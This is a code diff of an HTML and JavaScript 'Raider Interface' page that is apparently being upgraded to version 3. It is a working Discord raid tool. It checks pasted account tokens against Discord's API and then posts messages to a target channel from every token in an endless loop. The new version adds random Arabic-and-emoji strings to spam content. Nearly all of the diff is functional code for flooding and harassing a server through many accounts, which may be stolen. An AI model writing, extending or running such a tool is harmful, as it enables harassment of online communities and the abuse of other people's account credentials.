@@ -3,63 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Raider Interface</title>
+    <title>Web Raider Interface v3</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: #ffffff;
+            font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle at center, #240b36, #c31432, #000000);
+            color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            overflow-x: hidden;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            background: rgba(0, 0, 0, 0.85);
+            border: 2px solid #ff0055;
             padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            width: 90%;
-            max-width: 600px;
+            box-shadow: 0 0 30px #ff0055;
+            width: 95%;
+            max-width: 750px;
         }
-        h2 { text-align: center; margin-bottom: 25px; letter-spacing: 2px; }
-        .section { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 5px; font-size: 0.9em; color: #ccc; }
+        h2 { text-align: center; color: #ff0055; text-shadow: 0 0 15px #ff0055; margin-bottom: 25px; font-weight: 900; }
+        label { display: block; margin: 12px 0 5px; font-size: 0.8em; color: #ff0055; font-weight: bold; }
         textarea, input, select {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
+            padding: 12px;
             border-radius: 5px;
-            border: none;
-            background: rgba(0, 0, 0, 0.3);
-            color: white;
+            border: 1px solid #ff0055;
+            background: #111;
+            color: #fff;
             box-sizing: border-box;
+            outline: none;
         }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
         button {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-weight: bold;
+            font-weight: 800;
             transition: 0.3s;
-            margin-top: 10px;
+            margin-top: 15px;
+            letter-spacing: 1px;
         }
-        .btn-check { background: #00d2ff; color: white; }
-        .btn-raid { background: #ff416c; color: white; }
-        button:hover { opacity: 0.8; transform: translateY(-2px); }
+        .btn-check { background: #111; color: #ff0055; border: 1px solid #ff0055; }
+        .btn-raid { background: #ff0055; color: #fff; }
+        button:hover { background: #fff; color: #ff0055; box-shadow: 0 0 20px #fff; }
         #log {
             margin-top: 20px;
-            height: 150px;
+            height: 140px;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.5);
+            background: #000;
             padding: 10px;
-            font-size: 0.8em;
+            font-size: 0.75em;
             border-radius: 5px;
+            border: 1px solid #444;
+            color: #0f0;
             font-family: monospace;
         }
     </style>
@@ -67,106 +70,117 @@
 <body>
 
 <div class="container">
-    <h2>RAIDER INTERFACE</h2>
+    <h2>RAIDER INTERFACE V3</h2>
 
-    <div class="section">
-        <label>Tokens (1 line per token)</label>
-        <textarea id="tokens" placeholder="PASTE TOKENS HERE"></textarea>
+    <label>Tokens (One per line)</label>
+    <textarea id="tokens" placeholder="Tokens here..."></textarea>
+
+    <div class="grid">
+        <div>
+            <label>Channel ID</label>
+            <input type="text" id="channelId">
+        </div>
+        <div>
+            <label>Delay (ms)</label>
+            <input type="number" id="delay" value="1000">
+        </div>
     </div>
 
     <div class="grid">
-        <div class="section">
-            <label>Channel ID</label>
-            <input type="text" id="channelId" placeholder="1234567890">
-        </div>
-        <div class="section">
-            <label>Mode</label>
+        <div>
+            <label>Execution Mode</label>
             <select id="mode">
-                <option value="1">Mode 1: All at once</option>
-                <option value="2">Mode 2: One by one</option>
+                <option value="1">Mode 1 (All at once)</option>
+                <option value="2">Mode 2 (Sequential)</option>
+            </select>
+        </div>
+        <div>
+            <label>String Pattern</label>
+            <select id="pattern">
+                <option value="1">Arabic + Massive Emoji Mix</option>
+                <option value="2">No Random String</option>
             </select>
         </div>
     </div>
 
+    <label>Custom Messages (Comma separated)</label>
+    <textarea id="messages" placeholder="msg1, msg2, msg3..."></textarea>
+
     <div class="grid">
-        <div class="section">
-            <label>Delay (ms)</label>
-            <input type="number" id="delay" value="1000">
-        </div>
-        <div class="section">
-            <label>Reaction Emoji</label>
-            <input type="text" id="emoji" placeholder="🔥">
-        </div>
+        <button class="btn-check" onclick="checkTokens()">Check Tokens</button>
+        <button class="btn-raid" onclick="startRaid()">Execute Raid</button>
     </div>
 
-    <div class="section">
-        <label>Messages (Random - Comma separated)</label>
-        <textarea id="messages" placeholder="Hello, Raid, Mention @everyone"></textarea>
-    </div>
-
-    <button class="btn-check" onclick="checkTokens()">CHECK TOKENS</button>
-    <button class="btn-raid" onclick="startRaid()">START RAID / REACTION</button>
-
-    <div id="log">Waiting for action...</div>
+    <div id="log">SYSTEM READY...</div>
 </div>
 
 <script>
-    const log = (msg) => {
-        const logBox = document.getElementById('log');
-        logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-        logBox.scrollTop = logBox.scrollHeight;
+    const logger = (m) => {
+        const b = document.getElementById('log');
+        b.innerHTML = `<div>[${new Date().toLocaleTimeString()}] ${m}</div>` + b.innerHTML;
+    };
+
+    const genArabic = () => {
+        const ar = "ذرزسشصضطظعغفقكلمنهويابتثجحخد";
+        const em = [
+            "🔥","💀","💢","⚡","⚠️","🩸","🏴‍☠️","☣️","☢️","🚫","🆘",
+            "👺","👻","👽","👾","🤖","🦾","🔪","🧨","💣","🛸","❓",
+            "🧿","☄️","💥","🌀","👺","👹","🧿","💎","⛓️","🩸","💉"
+        ];
+        let s = "";
+        for(let i=0; i<8; i++) s += ar.charAt(Math.floor(Math.random() * ar.length));
+        for(let i=0; i<3; i++) s += em[Math.floor(Math.random() * em.length)];
+        return s;
     };
 
     async function checkTokens() {
-        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
-        log(`Checking ${tokens.length} tokens...`);
-        for (const token of tokens) {
-            const res = await fetch('https://discord.com/api/v9/users/@me', {
-                headers: { 'Authorization': token.trim() }
-            });
-            log(res.ok ? `VALID: ${token.substring(0, 10)}...` : `INVALID: ${token.substring(0, 10)}...`);
-        }
-    }
-
-    async function startRaid() {
-        const tokens = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
-        const channelId = document.getElementById('channelId').value;
-        const mode = document.getElementById('mode').value;
-        const delay = parseInt(document.getElementById('delay').value);
-        const msgList = document.getElementById('messages').value.split(',');
-        const emoji = document.getElementById('emoji').value;
-
-        if (!channelId) return alert('Input Channel ID');
-
-        log("Raid started.");
-
-        while (true) {
-            if (mode === "1") {
-                await Promise.all(tokens.map(async (t) => {
-                    const content = msgList[Math.floor(Math.random() * msgList.length)].trim();
-                    await executeAction(t.trim(), channelId, content, emoji);
-                }));
-                await new Promise(r => setTimeout(r, delay));
-            } else {
-                for (const t of tokens) {
-                    const content = msgList[Math.floor(Math.random() * msgList.length)].trim();
-                    await executeAction(t.trim(), channelId, content, emoji);
-                }
-                await new Promise(r => setTimeout(r, delay));
+        const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
+        for (const t of tks) {
+            try {
+                const r = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': t.trim() }
+                });
+                logger(r.ok ? `VALID: ${t.substring(0,12)}...` : `INVALID: ${t.substring(0,12)}...`);
+            } catch {
+                logger(`ERROR checking token.`);
             }
         }
     }
 
-    async function executeAction(token, channelId, content, emoji) {
-        try {
-            await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-                method: 'POST',
-                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: content })
+    async function startRaid() {
+        const tks = document.getElementById('tokens').value.split('\n').filter(t => t.trim());
+        const cid = document.getElementById('channelId').value;
+        const dly = parseInt(document.getElementById('delay').value);
+        const md = document.getElementById('mode').value;
+        const pt = document.getElementById('pattern').value;
+        const msgs = document.getElementById('messages').value.split(',');
+
+        if (!cid || tks.length === 0) return alert("Missing Parameters");
+
+        logger("RAID STARTED");
+
+        while (true) {
+            const currentTasks = tks.map(async (t) => {
+                let content = msgs[Math.floor(Math.random() * msgs.length)].trim();
+                if (pt === "1") content += " " + genArabic();
+                
+                return fetch(`https://discord.com/api/v9/channels/${cid}/messages`, {
+                    method: 'POST',
+                    headers: { 'Authorization': t.trim(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                });
             });
-            log(`Sent: ${content.substring(0, 10)}...`);
-        } catch (e) {
-            log("Error sending message");
+
+            if (md === "1") {
+                await Promise.all(currentTasks);
+                await new Promise(r => setTimeout(r, dly));
+            } else {
+                for (const task of currentTasks) {
+                    await task;
+                    await new Promise(r => setTimeout(r, Math.floor(dly / tks.length)));
+                }
+            }
+            logger(`Cycle processed with ${tks.length} accounts.`);
         }
     }
 </script>
